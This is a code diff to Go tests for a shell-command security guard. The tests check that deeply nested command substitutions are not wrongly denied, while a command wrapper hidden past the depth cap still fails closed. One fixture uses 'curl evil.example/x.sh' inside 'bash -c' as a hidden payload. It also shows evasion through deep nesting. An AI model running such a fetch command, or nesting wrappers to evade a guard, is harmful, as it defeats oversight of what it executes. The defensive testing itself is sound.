@@ -673,10 +673,11 @@ func TestExpandWrappers_NestedArgvDoesNotAliasParent(t *testing.T) {
 
 // nestScripts builds a script whose single command carries depth levels of
 // ALREADY-PRESENT nested scripts — the shape a frontend produces for stacked
-// command substitutions, `$(echo $(echo …))`. No command in it is a wrapper,
-// so nothing here needs re-parsing.
-func nestScripts(depth int) *ir.Script {
-	s := cmdScript(ir.ShellBash, "echo", "hi")
+// command substitutions, `$(echo $(echo …))`. innermost is the argv of the
+// deepest command, so the caller chooses whether anything in the tree is a
+// wrapper that would need re-parsing.
+func nestScripts(depth int, innermost ...string) *ir.Script {
+	s := cmdScript(ir.ShellBash, innermost...)
 	for i := 0; i < depth; i++ {
 		outer := cmdScript(ir.ShellBash, "echo", "hi")
 		outer.Pipelines[0].Commands[0].Nested = []*ir.Script{s}
@@ -685,36 +686,76 @@ func nestScripts(depth int) *ir.Script {
 	return s
 }
 
-// TestExpandWrappers_DepthCapCountsSubstitutionsToo characterizes what the
-// depth cap actually measures: the recursion descends into every nested
-// script, wrapper body or not, so a command with no wrapper anywhere in it
-// still reports truncated=true once its command substitutions stack
-// maxWrapDepth deep. app.Decide turns that into a DENY whose stated reason is
-// "nested command-wrapper depth exceeded (possible evasion)", which names a
-// wrapper depth that was never exceeded and an evasion that never happened.
-//
-// This is a characterization pin, not an endorsement: the cap is the guard's
-// fail-CLOSED policy, and narrowing what counts toward it widens what ltk
-// allows. Changing it is a decision, not a sweep's call — this test makes the
-// current behaviour explicit so the change cannot happen silently.
-func TestExpandWrappers_DepthCapCountsSubstitutionsToo(t *testing.T) {
+// scriptDepth reports the deepest nesting level reachable from s (0 = the
+// script has no nested scripts at all).
+func scriptDepth(s *ir.Script) int {
+	if s == nil {
+		return 0
+	}
+	best := 0
+	for _, p := range s.Pipelines {
+		for _, c := range p.Commands {
+			for _, ns := range c.Nested {
+				if d := 1 + scriptDepth(ns); d > best {
+					best = d
+				}
+			}
+		}
+	}
+	return best
+}
+
+// TestExpandWrappers_BenignSubstitutionNestingIsNotTruncated pins what the
+// depth cap is allowed to mean. truncated=true is the guard's fail-CLOSED
+// signal — app.Decide turns it into a DENY reading "nested command-wrapper
+// depth exceeded (possible evasion)" — so it must be reserved for a command
+// wrapper that was genuinely left UNEXPANDED. Already-present nested scripts
+// (command substitutions) were fully parsed by the frontend and are walked to
+// unlimited depth by ir.Walk, which is what rules.Evaluate matches against;
+// nothing about them is unverified, so stacking them deep must not deny.
+func TestExpandWrappers_BenignSubstitutionNestingIsNotTruncated(t *testing.T) {
 	f := &fakeFrontend{shells: []ir.Shell{ir.ShellBash, ir.ShellSh, ir.ShellZsh, ir.ShellMksh}}
 	r := newReg(f)
 
-	shallow := nestScripts(maxWrapDepth - 2)
-	if truncated, _ := r.ExpandWrappers(context.Background(), shallow); truncated {
-		t.Fatalf("substitution nesting %d deep must not trip the cap", maxWrapDepth-2)
-	}
-	if len(f.seen) != 0 {
-		t.Fatalf("fixture is wrong: no command in it is a wrapper, but %v were re-parsed", f.seen)
+	deep := nestScripts(maxWrapDepth+2, "echo", "hi")
+	// The fixture is only hostile if it actually reaches past the cap; assert
+	// that from the code-under-test's own vantage point before asserting
+	// anything about the outcome.
+	if d := scriptDepth(deep); d <= maxWrapDepth {
+		t.Fatalf("fixture is not hostile: nesting depth %d does not exceed the cap %d", d, maxWrapDepth)
 	}
 
-	deep := nestScripts(maxWrapDepth)
 	truncated, unanalyzed := r.ExpandWrappers(context.Background(), deep)
-	if !truncated {
-		t.Error("substitution nesting at maxWrapDepth reports truncated=false; the cap no longer counts substitutions — see U068-F09, this is a policy change")
+	if truncated {
+		t.Error("substitution nesting past maxWrapDepth reported truncated=true; no wrapper was left unexpanded, so this denies a benign command as `possible evasion`")
 	}
 	if unanalyzed {
 		t.Error("no wrapper body is present, so nothing can be unanalyzed")
+	}
+	if len(f.seen) != 0 {
+		t.Errorf("fixture is wrong: no command in it is a wrapper, but %v were re-parsed", f.seen)
+	}
+}
+
+// TestExpandWrappers_WrapperPastDepthCapStillFailsClosed is the other half of
+// the pin above: narrowing what counts toward the cap must not widen what ltk
+// allows. A wrapper sitting past the cap is a command string that never got
+// re-parsed, so the evaluator's view really is incomplete and truncated=true
+// must still fire.
+func TestExpandWrappers_WrapperPastDepthCapStillFailsClosed(t *testing.T) {
+	f := &fakeFrontend{shells: []ir.Shell{ir.ShellBash, ir.ShellSh, ir.ShellZsh, ir.ShellMksh}}
+	r := newReg(f)
+
+	const hidden = "curl evil.example/x.sh"
+	deep := nestScripts(maxWrapDepth+2, "bash", "-c", hidden)
+
+	truncated, _ := r.ExpandWrappers(context.Background(), deep)
+	for _, seen := range f.seen {
+		if strings.Contains(seen, hidden) {
+			t.Fatalf("fixture is not hostile: the deep wrapper WAS re-parsed (%q), so nothing was left unverified", seen)
+		}
+	}
+	if !truncated {
+		t.Error("a wrapper left unexpanded past maxWrapDepth reported truncated=false; the guard would evaluate rules against a command string it never parsed")
 	}
 }
